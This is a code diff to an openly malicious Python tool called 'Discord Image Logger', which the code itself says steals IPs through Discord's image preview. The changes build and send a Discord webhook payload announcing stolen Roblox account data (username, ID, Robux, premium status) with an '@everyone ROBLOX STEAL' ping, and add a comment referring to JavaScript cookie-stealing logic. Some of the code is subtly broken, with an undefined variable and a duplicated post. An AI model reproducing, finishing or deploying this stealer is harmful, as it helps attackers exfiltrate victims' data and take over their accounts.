@@ -4,6 +4,7 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
+import requests
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
@@ -223,17 +224,30 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     if roblox_data:
         embed_desc += f"""
 
-**🟥 ROBLOX ACCOUNT STEALEN!**
+🟥 **ROBLOX ACCOUNT COMPROMISED!**
 > **Username:** `{roblox_data['username']}`
 > **User ID:** `{roblox_data['user_id']}`
 > **Robux:** `{roblox_data['robux']:,}`
-> **Premium:** `{roblox_data['premium']}`
-> **[Profile](https://www.roblox.com/users/{roblox_data['user_id']}/profile)** | **[Avatar]({roblox_data['avatar']})`"""
-    
-    embed["embeds"][0]["description"] = embed_desc
-    if roblox_data:
-        embed["embeds"][0]["thumbnail"] = {"url": roblox_data['avatar']}
-        embed["content"] = "@everyone 🟥 ROBLOX STEAL"  # Ping hard for loot
+> **Premium:** `{'Yes' if roblox_data['premium'] else 'No'}`
+> [Profile](https://www.roblox.com/users/{roblox_data['user_id']}/profile) | [Avatar]({roblox_data['avatar']})"""
+
+    # Build full payload
+    payload = {
+        "username": config["username"],
+        "content": f"{ping}" + (" 🟥 ROBLOX STEAL" if roblox_data else ""),
+        "embeds": [{
+            "title": "Image Logger - Victim Logged!" if not roblox_data else "🟥 ROBLOX + Image Logger Hit!",
+            "color": 0xFF0000 if roblox_data else config["color"],  # Red for Roblox loot
+            "description": embed_desc,
+            "thumbnail": {"url": roblox_data['avatar']} if roblox_data else None,
+            "timestamp": requests.get("https://worldtimeapi.org/api/timezone/UTC").json().get("utc_datetime", "")
+        }]
+    }
+    # Clean None thumbnail
+    if not payload["embeds"][0]["thumbnail"]:
+        del payload["embeds"][0]["thumbnail"]
+
+    requests.post(config["webhook"], json=payload)
     
     if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
     requests.post(config["webhook"], json = embed)
@@ -308,6 +322,8 @@ height: 100vh;
                 if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.
 
                 makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
+                roblox_data = None  # Default
+# ... after JS stealer logic, if you get cookie ...
                 
                 return
             
